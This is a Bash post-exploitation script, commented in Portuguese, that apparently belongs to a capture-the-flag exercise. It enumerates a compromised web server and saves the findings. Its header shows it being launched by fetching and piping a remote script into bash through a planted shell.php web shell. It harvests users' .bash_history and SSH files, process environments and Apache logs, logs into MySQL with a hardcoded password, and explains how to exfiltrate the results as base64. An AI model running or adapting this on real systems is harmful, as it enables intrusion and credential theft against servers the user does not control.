#!/bin/bash
#
# Explora o servidor da Parte 1 (CTF9) e salva todos os resultados.
# Não usa 'ip' nem 'arp' — só alternativas (/proc, etc.).
# Uso: rodar na shell do servidor (www-data ou adalberto):
#   bash explorar_parte1.sh
# ou (se enviar o script):
#   curl -s "http://IP/shell.php?cmd=curl+-s+URL_do_script|bash"
#

OUTDIR="resultados_exploracao_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
exec 2>"$OUTDIR/00_erros.log"

log() { echo "[*] $1"; }
sec() { echo ""; echo "=== $1 ===" | tee -a "$OUTDIR/00_indice.txt"; }

log "Salvando resultados em: $OUTDIR"
sec "Início: $(date)"

# --- 1. Rede e hosts (sem ip, sem arp) ---
sec "1. Rede e hosts"
{
  echo "--- /etc/hosts ---"
  cat /etc/hosts 2>/dev/null || true
  echo ""
  echo "--- /proc/net/dev ---"
  cat /proc/net/dev 2>/dev/null || true
  echo ""
  echo "--- /sys/class/net ---"
  ls /sys/class/net/ 2>/dev/null || true
  echo ""
  echo "--- hostname -I ---"
  hostname -I 2>/dev/null || true
  echo ""
  echo "--- /proc/net/route ---"
  cat /proc/net/route 2>/dev/null || true
  echo ""
  echo "--- /etc/resolv.conf ---"
  cat /etc/resolv.conf 2>/dev/null || true
  echo ""
  echo "--- /proc/net/tcp ---"
  cat /proc/net/tcp 2>/dev/null || true
  echo ""
  echo "--- /proc/net/udp ---"
  cat /proc/net/udp 2>/dev/null || true
  echo ""
  echo "--- /proc/net/arp ---"
  cat /proc/net/arp 2>/dev/null || true
} > "$OUTDIR/01_rede_hosts.txt" 2>&1
log "1. Rede -> $OUTDIR/01_rede_hosts.txt"

# --- 2. Apache ---
sec "2. Apache"
{
  echo "--- sites-enabled (ls) ---"
  ls -la /etc/apache2/sites-enabled/ 2>/dev/null || true
  echo ""
  echo "--- sites-enabled (conteúdo) ---"
  for f in /etc/apache2/sites-enabled/*; do
    [ -f "$f" ] && echo ">> $f" && cat "$f" 2>/dev/null
  done
  echo ""
  echo "--- grep ProxyPass|Redirect|ServerName|ServerAlias ---"
  grep -r "ProxyPass\|Redirect\|ServerName\|ServerAlias" /etc/apache2/ 2>/dev/null || true
  echo ""
  echo "--- apache2.conf (primeiras 80 linhas) ---"
  head -80 /etc/apache2/apache2.conf 2>/dev/null || true
} > "$OUTDIR/02_apache.txt" 2>&1
log "2. Apache -> $OUTDIR/02_apache.txt"

# --- 3. Aplicação (test.php, noticias, index, files) ---
sec "3. Aplicação"
{
  echo "--- test.php ---"
  cat /var/www/blogo/test.php 2>/dev/null || true
  echo ""
  echo "--- noticias.php (primeiras 200 linhas) ---"
  head -200 /var/www/blogo/noticias.php 2>/dev/null || true
  echo ""
  echo "--- index.html (primeiras 100 linhas) ---"
  head -100 /var/www/blogo/index.html 2>/dev/null || true
  echo ""
  echo "--- files/ ---"
  ls -la /var/www/blogo/files/ 2>/dev/null || true
} > "$OUTDIR/03_aplicacao.txt" 2>&1
log "3. Aplicação -> $OUTDIR/03_aplicacao.txt"

# --- 4. Logs Apache ---
sec "4. Logs Apache"
{
  echo "--- access.log (últimas 100) ---"
  tail -100 /var/log/apache2/access.log 2>/dev/null || true
  echo ""
  echo "--- error.log (últimas 50) ---"
  tail -50 /var/log/apache2/error.log 2>/dev/null || true
  echo ""
  echo "--- grep projects-blogo|10.0.|internal ---"
  grep -E "projects-blogo|10\.0\.|internal" /var/log/apache2/access.log 2>/dev/null || true
} > "$OUTDIR/04_logs_apache.txt" 2>&1
log "4. Logs Apache -> $OUTDIR/04_logs_apache.txt"

# --- 5. Cron e systemd ---
sec "5. Cron e systemd"
{
  echo "--- /etc/cron.d ---"
  ls -la /etc/cron.d/ 2>/dev/null || true
  cat /etc/cron.d/* 2>/dev/null || true
  echo ""
  echo "--- cron.daily / cron.hourly ---"
  ls -la /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null || true
  echo ""
  echo "--- crontab root ---"
  crontab -l -u root 2>/dev/null || true
  echo ""
  echo "--- crontab adalberto ---"
  crontab -l -u adalberto 2>/dev/null || true
  echo ""
  echo "--- crontab www-data ---"
  crontab -l -u www-data 2>/dev/null || true
  echo ""
  echo "--- systemctl list-units --type=service ---"
  systemctl list-units --type=service 2>/dev/null || true
  echo ""
  echo "--- /etc/systemd/system/*.service ---"
  ls /etc/systemd/system/*.service 2>/dev/null || true
  echo ""
  echo "--- grep curl|wget|mysql|ssh|below em .service ---"
  grep -l "curl\|wget\|mysql\|ssh\|below" /etc/systemd/system/*.service 2>/dev/null || true
} > "$OUTDIR/05_cron_systemd.txt" 2>&1
log "5. Cron/systemd -> $OUTDIR/05_cron_systemd.txt"

# --- 6. Home usuários (.bash_history, .ssh) ---
sec "6. Home usuários"
{
  echo "--- adalberto .bash_history ---"
  cat /home/adalberto/.bash_history 2>/dev/null || true
  echo ""
  echo "--- adalberto .ssh (ls) ---"
  ls -la /home/adalberto/.ssh/ 2>/dev/null || true
  echo ""
  echo "--- adalberto .ssh/config ---"
  cat /home/adalberto/.ssh/config 2>/dev/null || true
  echo ""
  echo "--- adalberto .ssh/known_hosts ---"
  cat /home/adalberto/.ssh/known_hosts 2>/dev/null || true
  echo ""
  echo "--- ubuntu home (ls) ---"
  ls -la /home/ubuntu/ 2>/dev/null || true
  echo ""
  echo "--- ubuntu .bash_history ---"
  cat /home/ubuntu/.bash_history 2>/dev/null || true
  echo ""
  echo "--- ubuntu .ssh ---"
  ls -la /home/ubuntu/.ssh/ 2>/dev/null || true
} > "$OUTDIR/06_home_usuarios.txt" 2>&1
log "6. Home usuários -> $OUTDIR/06_home_usuarios.txt"

# --- 7. MySQL ---
sec "7. MySQL"
{
  mysql --protocol=TCP -h 127.0.0.1 -u blogodb -p'WPcmqw16ZmzO!5paSC4' -e "
    SHOW VARIABLES LIKE '%hostname%';
    SHOW VARIABLES LIKE '%datadir%';
    SELECT * FROM information_schema.SCHEMATA;
    SELECT table_schema, table_name FROM information_schema.TABLES LIMIT 50;
  " 2>/dev/null || echo "(mysql falhou ou não disponível)"
} > "$OUTDIR/07_mysql.txt" 2>&1
log "7. MySQL -> $OUTDIR/07_mysql.txt"

# --- 8. Processos e env Apache ---
sec "8. Processos e env"
{
  echo "--- ps auxeww (primeiros 80) ---"
  ps auxeww 2>/dev/null | head -80 || true
  echo ""
  echo "--- Apache environ (primeiro processo) ---"
  APID=$(pgrep -f apache2 2>/dev/null | head -1)
  if [ -n "$APID" ]; then
    cat /proc/"$APID"/environ 2>/dev/null | tr '\0' '\n' || true
  else
    echo "(nenhum processo apache2 encontrado)"
  fi
} > "$OUTDIR/08_processos_env.txt" 2>&1
log "8. Processos/env -> $OUTDIR/08_processos_env.txt"

# --- 9. Logs below e outros ---
sec "9. Logs below e outros"
{
  echo "--- /var/log/below ---"
  ls -la /var/log/below/ 2>/dev/null || true
  cat /var/log/below/* 2>/dev/null || true
  echo ""
  echo "--- /var/log (ls) ---"
  ls -la /var/log/ 2>/dev/null || true
  echo ""
  echo "--- grep 10.0.|internal|projetos|blogo em *.log ---"
  grep -r "10\.0\.\|internal\|projetos\|blogo" /var/log/*.log 2>/dev/null | head -50 || true
} > "$OUTDIR/09_logs_below_outros.txt" 2>&1
log "9. Logs below/outros -> $OUTDIR/09_logs_below_outros.txt"

# --- 10. Grep em configs ---
sec "10. Grep host/url/proxy"
{
  grep -ri "host\|url\|proxy\|internal\|10\.0\.\|blogo\|projeto" /etc/apache2/ /var/www/blogo/*.php /var/www/blogo/config/ 2>/dev/null || true
} > "$OUTDIR/10_grep_configs.txt" 2>&1
log "10. Grep configs -> $OUTDIR/10_grep_configs.txt"

# --- Resumo ---
sec "Fim"
echo "Fim: $(date)" >> "$OUTDIR/00_indice.txt"
log "Concluído. Resultados em: $OUTDIR/"
echo ""
echo "Arquivos gerados:"
ls -la "$OUTDIR/"
echo ""
echo "Para trazer os resultados para sua máquina (no servidor):"
echo "  cd $(pwd) && tar czvf - $OUTDIR | base64"
echo "Cole o base64 na sua máquina e: base64 -d | tar xzvf -"
